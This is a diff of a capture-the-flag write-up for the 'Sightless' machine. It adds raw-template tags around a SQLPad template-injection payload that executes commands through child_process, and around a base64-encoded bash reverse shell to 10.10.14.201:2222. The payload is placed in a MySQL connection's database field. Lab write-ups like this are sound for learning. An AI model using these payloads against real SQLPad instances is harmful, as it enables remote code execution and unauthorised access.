@@ -79,12 +79,16 @@ Going to sqlpad.sightless.htb gives us access to a simple sqlpad interface :
 ![sqlpad.png](/assets/img/sightless/sqlpad.png)
 This is the right time to keep in mind that this is an easy box. Where on an insane/hard, we would probably have to understand a lot about how sqlpad works, this is not the case here. In fact we are on google search away from getting a shell. The website displays `sqlpad version 6.10.0`. Googling sqlpad exploit leads to [this post](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb), which describes a vulnerability affecting all sqlpad instance for versions prior to 6.10.1. The payload is the following :
 ```python
+{% raw %}
 {{ process.mainModule.require('child_process').exec('id>/tmp/pwn') }}
+{% endraw %}
 ```
 To get a shell from it, I'll use the standard bash reverse shell, and base64 encode it to avoid bad characters :
 `bash -i >& /dev/tcp/10.10.14.201/2222 0>&1`. My final payload is :
 ```python
-\{\{ process.mainModule.require('child_process').exec('echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMDEvMjIyMiAwPiYx |base64 -d|bash') }}
+{% raw %}
+{{ process.mainModule.require('child_process').exec('echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMDEvMjIyMiAwPiYx |base64 -d|bash') }}
+{% endraw %}
 ```
 Now I follow the blog post describing the exploit, I create a new connection using the MySQL driver, and put my payload as the database :
 ![editconnectionsqlpad.png](/assets/img/sightless/editconnectionsqlpad.png)
